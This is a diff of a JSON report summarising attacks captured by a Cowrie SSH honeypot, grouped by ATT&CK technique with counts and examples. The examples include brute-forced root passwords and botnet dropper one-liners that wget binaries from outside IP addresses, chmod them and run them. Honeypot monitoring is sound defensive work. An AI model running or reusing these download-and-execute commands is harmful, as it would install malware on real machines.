@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 08:02:06",
+  "generated": "2026-08-18 09:00:53",
   "totals": {
-    "commands": 3758,
-    "login_failed": 2626,
-    "login_success": 1153,
-    "sessions": 2683
+    "commands": 4856,
+    "login_failed": 3060,
+    "login_success": 1513,
+    "sessions": 3120
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2626,
+      "count": 3060,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T08:01:59.520346Z",
-      "unique_ips": 38
+      "last": "2026-08-18T09:00:48.330367Z",
+      "unique_ips": 45
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1153,
+      "count": 1513,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T08:01:59.955685Z",
-      "unique_ips": 22
+      "last": "2026-08-18T09:00:48.706985Z",
+      "unique_ips": 27
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 56,
+      "count": 71,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T06:55:25.724678Z",
-      "unique_ips": 6
+      "last": "2026-08-18T08:24:19.860082Z",
+      "unique_ips": 7
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 23,
+      "count": 29,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -69,8 +69,8 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T07:35:46.375545Z",
-      "unique_ips": 5
+      "last": "2026-08-18T08:24:19.860082Z",
+      "unique_ips": 7
     },
     {
       "id": "T1082",
@@ -90,14 +90,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 6,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-18T03:14:17.803787Z",
-      "last": "2026-08-18T06:55:25.724678Z",
-      "unique_ips": 5
+      "last": "2026-08-18T08:23:43.706748Z",
+      "unique_ips": 6
     },
     {
       "id": "T1059.004",
@@ -128,19 +128,19 @@
   "unmapped": [
     [
       "system",
-      1137
+      1491
     ],
     [
       "shell",
-      1136
+      1490
     ],
     [
       "sh",
-      1136
+      1490
     ],
     [
       "/bin/busybox",
-      251
+      259
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -148,27 +148,27 @@
     ],
     [
       "cd /proc && cat self/cmdline",
-      5
+      7
     ],
     [
       "enable",
-      4
+      5
     ],
     [
       "linuxshell",
-      4
+      5
     ],
     [
       "enablelinuxshell",
-      4
+      5
     ],
     [
       "ping ;sh",
-      4
+      5
     ],
     [
       "busybox",
-      2
+      3
     ],
     [
       "RPMA",
@@ -196,6 +196,14 @@
     ],
     [
       "/bin/busybox MIORI",
+      1
+    ],
+    [
+      "Connection: close",
+      1
+    ],
+    [
+      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
       1
     ]
   ]
